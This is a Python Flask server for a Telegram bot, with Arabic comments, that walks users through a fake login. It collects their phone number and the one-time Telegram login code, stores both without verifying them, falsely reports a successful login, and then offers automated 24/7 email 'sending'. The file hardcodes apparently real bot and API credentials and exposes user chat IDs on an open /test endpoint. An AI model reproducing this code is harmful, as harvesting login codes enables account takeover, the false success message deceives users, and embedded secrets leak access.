from flask import Flask, request, jsonify
import requests
import re
import os
import logging

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# المتغيرات البيئية
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8328267645:AAEgq7skSPifXizqPriMkiUt4oDPPm-I5R8")
API_ID = os.environ.get('API_ID', "22154260")
API_HASH = os.environ.get('API_HASH', '6bae7de9fdd9031aede658ec8a8b57c0')
PORT = int(os.environ.get('PORT', 10000))

# تخزين بيانات المستخدمين
user_data = {}

def send_telegram_message(chat_id, text):
    """إرسال رسالة عبر بوت التلغرام"""
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': text
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            logger.info(f"✅ تم إرسال رسالة لـ {chat_id}")
            return True
        else:
            logger.error(f"❌ فشل إرسال رسالة: {response.text}")
            return False
    except Exception as e:
        logger.error(f"❌ خطأ في إرسال الرسالة: {e}")
        return False

@app.route('/')
def home():
    return "🤖 البوت يعمل بشكل طبيعي!"

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy", "users": len(user_data)})

@app.route('/api/webhook', methods=['POST'])
def webhook():
    """webhook لاستقبال الرسائل من التلغرام"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        message = data.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '').strip()
        
        if not chat_id:
            return jsonify({"status": "error", "message": "No chat ID"}), 400
        
        logger.info(f"📩 Received: {text} from {chat_id}")
        
        # تهيئة بيانات المستخدم إذا لم يكن موجوداً
        if chat_id not in user_data:
            user_data[chat_id] = {
                'state': 'start',
                'phone': '',
                'code': '',
                'authenticated': False,
                'running': False,
                'message_count': 0
            }
        
        user = user_data[chat_id]
        
        # معالجة الأوامر
        if text == '/start':
            user['state'] = 'awaiting_phone'
            send_telegram_message(chat_id, "📱 أرسل رقم هاتفك مع رمز الدولة:\nمثال: +1234567890")
        
        elif user['state'] == 'awaiting_phone' and text.startswith('+'):
            user['phone'] = text
            user['state'] = 'awaiting_code'
            send_telegram_message(chat_id, f"📞 تم حفظ الرقم: {text}\n🔐 الآن أرسل الرمز الذي وصلك على التلغرام:")
        
        elif user['state'] == 'awaiting_code':
            user['code'] = text
            user['authenticated'] = True
            user['state'] = 'authenticated'
            send_telegram_message(chat_id, f"✅ تم تسجيل الدخول بنجاح!\n📧 الآن أرسل:\n/start_email your_email@gmail.com")
        
        elif text.startswith('/start_email'):
            if user['authenticated']:
                # البحث عن البريد الإلكتروني في النص
                email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
                if email_match:
                    email = email_match.group()
                    user['running'] = True
                    user['email'] = email
                    send_telegram_message(chat_id, f"🚀 بدأ الإرسال باستخدام:\n{email}\n\n⚡ البوت يعمل الآن 24/7\n\nلإيقاف البوت أرسل /stop")
                else:
                    send_telegram_message(chat_id, "❌ لم يتم العثور على بريد إلكتروني\n\n📋 استخدم:\n/start_email example@gmail.com")
            else:
                send_telegram_message(chat_id, "❌ يجب تسجيل الدخول أولاً\n\nأرسل /start لبدء المصادقة")
        
        elif text == '/stop':
            if user['running']:
                user['running'] = False
                send_telegram_message(chat_id, f"🛑 تم إيقاف البوت\n\n📊 عدد الرسائل: {user['message_count']}")
            else:
                send_telegram_message(chat_id, "⚠️ البوت غير نشط")
        
        elif text == '/status':
            status = "✅ مصادق" if user['authenticated'] else "❌ غير مصادق"
            bot_status = "🟢 نشط" if user['running'] else "🔴 متوقف"
            email_info = f"\n📧 البريد: {user.get('email', 'لم يحدد')}" if user.get('email') else ""
            
            message = f"""
📊 حالة حسابك:
• المصادقة: {status}
• حالة البوت: {bot_status}
• عدد الرسائل: {user['message_count']}
{email_info}
            """.strip()
            
            send_telegram_message(chat_id, message)
        
        elif text == '/help':
            help_text = """
📋 أوامر البوت:

/start - بدء عملية المصادقة
/start_email email - بدء الإرسال التلقائي
/stop - إيقاف البوت
/status - عرض حالة حسابك
/help - عرض هذه المساعدة

📝 مثال:
1. أرسل /start
2. أرسل رقم هاتفك مثل: +1234567890
3. أرسل الرمز الذي وصلك
4. أرسل: /start_email test@gmail.com
            """.strip()
            
            send_telegram_message(chat_id, help_text)
        
        else:
            if user['state'] == 'awaiting_phone':
                send_telegram_message(chat_id, "❌ رقم غير صحيح\n\nاستخدم الصيغة: +1234567890")
            elif user['state'] == 'awaiting_code':
                send_telegram_message(chat_id, "❌ الرمز غير صحيح\n\nأرسل الرمز الذي وصلك على التلغرام")
            else:
                send_telegram_message(chat_id, "❌ أمر غير معروف\n\nأرسل /help للمساعدة")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        logger.error(f"❌ خطأ في webhook: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/test')
def test():
    return jsonify({
        "status": "working",
        "users_count": len(user_data),
        "users": list(user_data.keys())
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
